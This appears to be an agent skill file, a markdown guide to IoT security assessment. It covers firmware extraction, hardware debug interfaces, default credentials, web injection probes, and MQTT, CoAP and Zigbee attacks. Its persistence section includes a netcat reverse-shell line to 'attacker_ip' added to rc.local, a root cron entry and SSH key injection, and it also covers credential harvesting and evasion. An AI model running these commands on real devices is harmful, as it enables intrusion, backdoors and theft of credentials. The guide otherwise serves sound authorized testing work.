---
name: iot_exploitation
description: Learn IoT security assessment including firmware extraction and analysis (binwalk, unblob), hardware interface attacks (UART, JTAG, SPI), protocol exploitation (MQTT, CoAP, Zigbee, Z-Wave), embedded Linux privilege escalation, and QEMU emulation techniques.
---
# IoT Exploitation

## When to Use This Skill

- Assessing IoT devices (routers, cameras, smart home devices, embedded systems)
- Extracting and analyzing firmware from devices
- Attacking hardware debug interfaces (UART, JTAG, SPI)
- Exploiting IoT-specific protocols (MQTT, CoAP, Zigbee, Z-Wave)
- Performing embedded Linux privilege escalation
- Emulating firmware for dynamic analysis without physical hardware

---

## Concepts

### IoT Attack Surface

1. **Network services** — Web interfaces, Telnet/SSH, UPnP, custom protocols
2. **Wireless interfaces** — WiFi, Bluetooth/BLE, Zigbee, Z-Wave, LoRa
3. **Hardware interfaces** — UART, JTAG, SWD, SPI, I2C
4. **Firmware** — Embedded filesystems, binaries, configuration files
5. **Cloud backend** — APIs, mobile apps, certificate pinning

### Key Statistics (2024)

- 820K daily IoT attacks; 107% year-over-year increase in endpoint attacks
- 98% of IoT device traffic is unencrypted
- Average IoT device attack lasts 52+ hours per week
- CVE-2023-1389 (TP-Link command injection) still affects 21% of SMBs

---

## Reconnaissance

### Network Discovery

**Shodan/Censys for IoT**:
```
# Shodan queries
port:23 "BusyBox"                    # Telnet with BusyBox
port:80 "GoAhead" country:US         # GoAhead web servers
port:554 "IP Camera"                 # RTSP cameras
port:1883 "MQTT"                     # MQTT brokers
product:"MikroTik" port:8291         # MikroTik devices
http.html:"router" port:80           # Generic routers

# Censys queries
services.port:23 and services.banner:"BusyBox"
services.http.response.html_title:"Camera"
```

**Local Network Discovery**:
```bash
# Common IoT ports
nmap -sS -p21,22,23,80,443,554,1883,5683,8080,8443,8883 192.168.1.0/24

# UPnP discovery
nmap -sU -p1900 --script upnp-info 192.168.1.0/24

# mDNS/Bonjour discovery
avahi-browse -art
```

**Metasploit Discovery**:
```
msf6 > use auxiliary/scanner/upnp/ssdp_msearch
msf6 > set RHOSTS 192.168.1.0/24
msf6 > run

msf6 > use auxiliary/scanner/http/http_version
msf6 > set RHOSTS file:/tmp/iot_ips.txt
msf6 > run
```

### Firmware Acquisition

| Method | Description |
|--------|-------------|
| Manufacturer portal | Download from support/updates page |
| Update interception | MITM device update process |
| Physical extraction | Read from SPI flash/EEPROM via hardware |
| UART/JTAG dump | Extract via debug interfaces |

**FCC ID Lookup** — fcc.gov/oet/ea/fccid — reveals internal photos, user manuals, RF specifications, sometimes board layouts with labeled debug ports.

---

## Firmware Analysis

### Extraction Tools

**Binwalk v3** (2024 Rust rewrite):
```bash
# Scan for embedded files and signatures
binwalk firmware.bin

# Extract all recognized files
binwalk -e firmware.bin

# Recursive extraction (Matryoshka mode)
binwalk -eM firmware.bin

# Entropy analysis (detect encryption/compression)
binwalk -E firmware.bin
# Flat high entropy = encrypted
# Variable high entropy = compressed
```

**Unblob** (modern alternative, fewer false positives):
```bash
# Basic extraction
unblob firmware.bin -e extracted/

# Verbose with reporting
unblob -v firmware.bin -e extracted/ --report report.json

# Better for large firmwares (4GB+), uses Hyperscan
```

**Manual Extraction**:
```bash
# Find filesystem offset from binwalk output
dd if=firmware.bin bs=1 skip=<offset> of=filesystem.squashfs

# Extract specific filesystem types
unsquashfs filesystem.squashfs
jefferson -d jffs2_out firmware.jffs2     # JFFS2
ubi_reader/ubireader_extract_files ubi.img # UBI
```

### Filesystem Analysis

**Common Targets**:
```bash
# After extraction, search for:
# Credentials
grep -rn "password\|passwd\|secret\|api_key" .
cat etc/shadow etc/passwd
find . -name "*.conf" -exec grep -l password {} \;

# SSH keys
find . -name "id_rsa*" -o -name "authorized_keys"

# Web application secrets
find . -name "*.php" -exec grep -l "\$_\|mysql_\|password" {} \;

# Startup scripts (backdoor opportunities)
cat etc/init.d/* etc/rc.local

# Binary configuration
strings usr/bin/* | grep -i "http\|ftp\|password"
```

**Firmwalker** (automated analysis):
```bash
./firmwalker.sh extracted_firmware/
# Searches for: passwords, private keys, SSL certs, config files,
# email addresses, URLs, IP addresses, shell scripts
```

### Binary Analysis

**Architecture Identification**:
```bash
file usr/bin/httpd
# Output: ELF 32-bit LSB executable, MIPS, MIPS32 version 1
readelf -h usr/bin/httpd | grep Machine
```

**String Analysis**:
```bash
strings -n 8 binary | grep -i "password\|admin\|http\|config"

# Cross-reference strings with functions
rabin2 -z binary    # Radare2
```

**Common Vulnerabilities**:
- Command injection (system(), popen() with user input)
- Buffer overflows (strcpy, sprintf, gets without bounds)
- Hardcoded credentials (embedded strings)
- Path traversal (insufficient input validation)
- Format string (printf with user-controlled format)

### Firmware Emulation (QEMU)

**User-Mode Emulation** (single binary):
```bash
# Copy QEMU static binary to extracted root
cp $(which qemu-mipsel-static) ./extracted/usr/bin/

# Chroot and run binary
sudo chroot ./extracted /usr/bin/qemu-mipsel-static /usr/bin/httpd

# Debug with GDB
qemu-mipsel-static -g 1234 ./binary &
gdb-multiarch ./binary -ex "target remote :1234"
```

**System-Mode Emulation** (full firmware):
```bash
# Firmadyne (automated emulation)
./sources/extractor/extractor.py -b <brand> -sql 127.0.0.1 -np -nk firmware.bin
./scripts/getArch.sh ./images/*.tar.gz
./scripts/makeImage.sh <image_id>
./scripts/inferNetwork.sh <image_id>
./scratch/<image_id>/run.sh

# ARM-X Framework
armx <firmware_dir>
```

**Emulation Considerations**:
- Network services may need bridged/NAT network configuration
- NVRAM emulation often required (use nvram-faker)
- Hardware-dependent code may fail; patch or bypass

---

## Hardware Exploitation

### UART (Universal Asynchronous Receiver-Transmitter)

**Pin Identification**:
```
Common pinouts (4 pins): VCC, GND, TX, RX
- GND: Continuity with board ground/shielding
- VCC: Usually 3.3V or 5V (verify before connecting!)
- TX:  Use oscilloscope/logic analyzer, shows activity at boot
- RX:  Often adjacent to TX, minimal activity
```

**Tools**: USB-TTL adapter (FT232, CP2102), JTAGulator (auto-detect), Bus Pirate, Attify Badge

**Connection**:
```bash
# Most common baud rate: 115200 (second most: 9600)
screen /dev/ttyUSB0 115200
minicom -D /dev/ttyUSB0 -b 115200

# If garbage output, try other rates: 9600, 19200, 38400, 57600

# Auto baud rate detection with JTAGulator
uart> U
# Specify pin range, JTAGulator tests common rates
```

**Exploitation**:
- Boot interrupt (press keys during bootloader, often Enter, Space, or Esc)
- U-Boot: Interrupt, modify bootargs to append `init=/bin/sh`
- Direct root shell (common misconfiguration)
- Extract bootloader, kernel, filesystem info

### JTAG/SWD (Joint Test Action Group / Serial Wire Debug)

**JTAG Pins**: TDI, TDO, TCK, TMS, TRST (optional), GND
**SWD Pins**: SWDIO, SWCLK, GND (2-wire alternative to JTAG)

**Pin Discovery**:
```bash
# JTAGulator automatic detection
jtag> b    # BYPASS scan
# Specify pin range, JTAGulator identifies JTAG pinout

# OpenOCD with known pinout
openocd -f interface/jlink.cfg -f target/stm32f1x.cfg
```

**Capabilities**:
- Full memory read/write access
- CPU halt, step, breakpoint
- Firmware extraction from flash
- Bypass secure boot (device-dependent)

**Tools**: JTAGulator, Segger J-Link, Bus Pirate, OpenOCD (software)

### SPI Flash Extraction

**Pin Identification**: CS (Chip Select), MISO, MOSI, CLK, VCC, GND

**In-Circuit Reading** (preferred):
```bash
# Using flashrom with supported programmer
flashrom -p ch341a_spi -r firmware_dump.bin

# Bus Pirate
flashrom -p buspirate_spi:dev=/dev/ttyUSB0 -r dump.bin
```

**Chip-Off** (desolder flash chip):
- Required when in-circuit fails
- Use hot air rework station
- Read with SOIC clip or socket adapter

---

## Network Service Exploitation

### Default Credentials

**Common IoT Defaults**:
| Vendor/Device | Username | Password |
|--------------|----------|----------|
| Generic | admin | admin, password, 1234 |
| Hikvision | admin | 12345 |
| Dahua | admin | admin |
| Ubiquiti | ubnt | ubnt |
| MikroTik | admin | (blank) |
| TP-Link | admin | admin |

**Metasploit Credential Testing**:
```
msf6 > use auxiliary/scanner/http/http_login
msf6 > set RHOSTS 192.168.1.0/24
msf6 > set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
msf6 > set PASS_FILE /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt
msf6 > run
```

### Web Interface Exploitation

**Common Vulnerabilities**:
```bash
# Command injection (common in IoT web interfaces)
# Test parameters: ping, traceroute, diagnostic forms
;id
|id
`id`
$(id)
%0aid

# Path traversal
../../../etc/passwd
....//....//....//etc/passwd

# Authentication bypass
# Try direct access to: /admin.cgi, /system.ini, /config/config.ini
```

**Metasploit Web Modules**:
```
# Router-specific exploits
msf6 > search type:exploit router
msf6 > search type:exploit dlink
msf6 > search type:exploit netgear
msf6 > search type:exploit tplink

# Example: Netgear command injection
msf6 > use exploit/linux/http/netgear_r7000_cgibin_exec
```

### UPnP Exploitation

**Discovery**:
```bash
# SSDP discovery
nmap -sU -p1900 --script upnp-info 192.168.1.0/24

# Miranda UPnP tool
miranda> msearch
miranda> host list
miranda> host get 0
miranda> host info 0
```

**AddPortMapping Abuse**:
```python
# Opens port on router to internal host
# Can be used to expose internal services or create C2 channel
# Requires LAN access (no authentication typically needed)
```

**Metasploit**:
```
msf6 > use auxiliary/scanner/upnp/ssdp_msearch
msf6 > use auxiliary/scanner/upnp/ssdp_amp  # Amplification test
```

---

## Protocol Attacks

### MQTT (Message Queuing Telemetry Transport)

**Discovery and Enumeration**:
```bash
# Default port 1883 (unencrypted), 8883 (TLS)
nmap -sV -p1883,8883 target

# Connect and subscribe to all topics
mosquitto_sub -h target -t '#' -v

# Subscribe with wildcard patterns
mosquitto_sub -h target -t '+/status/#' -v

# If auth required, try defaults: admin/admin, guest/guest
mosquitto_sub -h target -t '#' -u admin -P admin
```

**Exploitation**:
```bash
# Publish malicious messages
mosquitto_pub -h target -t 'home/alarm/set' -m 'OFF'
mosquitto_pub -h target -t 'device/command' -m '{"action":"reboot"}'

# Topic brute force
for topic in $(cat mqtt_topics.txt); do
    mosquitto_pub -h target -t "$topic" -m 'test' 2>/dev/null && echo "Writable: $topic"
done
```

**Vulnerabilities**:
- Anonymous access (no authentication)
- Lack of ACLs (any client can pub/sub any topic)
- Cleartext transmission (credential sniffing)
- Message injection/manipulation

### CoAP (Constrained Application Protocol)

**Discovery**:
```bash
# Default port: 5683 (UDP)
nmap -sU -p5683 target

# Resource discovery
coap-client -m get coap://target/.well-known/core

# Query specific resources
coap-client -m get coap://target/sensor/temperature
coap-client -m put -e '{"value":0}' coap://target/actuator/switch
```

**Vulnerabilities**: No authentication default, IP spoofing, cross-protocol attacks

### Zigbee

**Requirements**: Zigbee-compatible radio (CC2531, HackRF with GNURadio, or Ubertooth)

**KillerBee Framework**:
```bash
# Channel scanning
zbstumbler -i <interface>

# Packet capture
zbdump -i <interface> -w capture.pcap -c <channel>

# Key sniffing (if default trust center key used)
# Default key: 5A:69:67:42:65:65:41:6C:6C:69:61:6E:63:65:30:39

# Replay attacks
zbreplay -i <interface> -r capture.pcap
```

### Z-Wave

**Security Levels**:
- S0: Legacy encryption (known vulnerabilities, key exchange sniffable)
- S2: Modern encryption (more secure)

**Attacks**:
- Downgrade to S0 during pairing
- Sniff S0 key exchange
- Replay captured commands
- Jamming during pairing to force re-pair

---

## Embedded Linux Exploitation

### Privilege Escalation

**BusyBox-Specific Checks**:
```bash
# Check BusyBox version and applets
busybox --help

# SUID BusyBox = privilege escalation
find / -perm -4000 -exec ls -la {} \; 2>/dev/null
# If busybox has SUID:
busybox sh -p   # Spawn privileged shell
```

**Common IoT Privesc Vectors**:
```bash
# Writable cron/init scripts
ls -la /etc/cron* /etc/init.d/

# Weak file permissions
find / -writable -type f 2>/dev/null

# Kernel version (for exploit selection)
uname -a
cat /proc/version

# 2024 Critical: CVE-2024-1086 (netfilter use-after-free)
# Affects kernels 5.14 - 6.6.14, check if unprivileged namespaces enabled
```

### Persistence

**Init Script Backdoor**:
```bash
# Add to rc.local or init.d script
echo '/bin/nc -e /bin/sh attacker_ip 4444 &' >> /etc/rc.local
```

**Cron Persistence** (if available):
```bash
echo '* * * * * /tmp/shell.sh' >> /var/spool/cron/crontabs/root
```

**SSH Key Injection**:
```bash
mkdir -p /root/.ssh
echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

### Credential Harvesting

```bash
# Shadow file (often readable on IoT)
cat /etc/shadow

# Configuration files
grep -r "password\|passwd\|secret" /etc/ /var/ 2>/dev/null

# Process memory (for running services)
strings /proc/<pid>/maps

# Flash partitions
cat /dev/mtd* | strings | grep -i pass

# NVRAM on many routers
nvram show | grep -i pass
```

---

## Cloud Backend and Mobile App Analysis

### Mobile App Reverse Engineering

```bash
# APK extraction
apktool d app.apk -o app_extracted/

# Search for API endpoints, keys
grep -rn "api\|key\|secret\|http" app_extracted/

# Hardcoded credentials
grep -rn "password\|token" app_extracted/smali/
```

### Certificate Pinning Bypass

**Frida/Objection**:
```bash
# Install
pip3 install frida-tools objection

# Bypass SSL pinning (Android)
objection -g com.target.app explore
objection> android sslpinning disable

# Frida script for custom pinning
frida -U -f com.target.app -l ssl_bypass.js
```

### API Testing

Once pinning bypassed, proxy traffic through Burp Suite:
- Enumerate API endpoints
- Test authentication weaknesses
- Check for IDOR vulnerabilities
- Analyze firmware update mechanisms

---

## Evasion Considerations

### Firmware Modification Detection

- Many devices verify firmware signatures (secure boot)
- Check for write protection on flash (hardware or software)
- Some devices phone home for validation

### Network Detection

- Avoid excessive scanning on IoT networks (devices often fragile)
- Use passive reconnaissance where possible
- Rate-limit active probes

### Hardware Analysis OPSEC

- Document original state before modifications
- Some devices log access attempts
- JTAG/UART access may be logged or trigger alerts

---

## Workflows

### IoT Device Assessment Workflow

1. **Reconnaissance**:
   ```bash
   # Network discovery
   nmap -sV -p21,22,23,80,443,1883,5683 192.168.1.0/24
   # UPnP enumeration
   nmap -sU -p1900 --script upnp-info 192.168.1.0/24
   ```

2. **Firmware acquisition**:
   - Download from manufacturer
   - Intercept updates via MITM
   - Physical extraction if needed

3. **Static analysis**:
   ```bash
   binwalk -eM firmware.bin
   cd _firmware.bin.extracted
   # Search for secrets, analyze binaries
   ```

4. **Dynamic analysis** (emulation or hardware):
   ```bash
   # QEMU emulation or connect to physical device
   # Test web interface, services
   ```

5. **Exploitation and documentation**

### Firmware Analysis Workflow

1. **Identify and extract**:
   ```bash
   binwalk -E firmware.bin       # Check encryption
   binwalk -eM firmware.bin      # Extract
   ```

2. **Filesystem analysis**:
   ```bash
   find . -name "*.conf" -o -name "passwd" -o -name "shadow"
   grep -rn password .
   ```

3. **Binary analysis**:
   ```bash
   file $(find . -type f -executable)
   strings <binary> | grep -i password
   ```

4. **Emulation for dynamic testing**:
   ```bash
   qemu-<arch>-static ./extracted/usr/bin/httpd
   ```

### Hardware Hacking Workflow

1. **Visual inspection**: Identify chips, debug ports, test points
2. **Documentation**: FCC ID lookup, datasheet acquisition
3. **Pin identification**: Multimeter for GND, oscilloscope for TX
4. **UART connection**: Test 115200 baud first
5. **Boot interrupt**: Try to access bootloader
6. **Shell access or firmware dump**
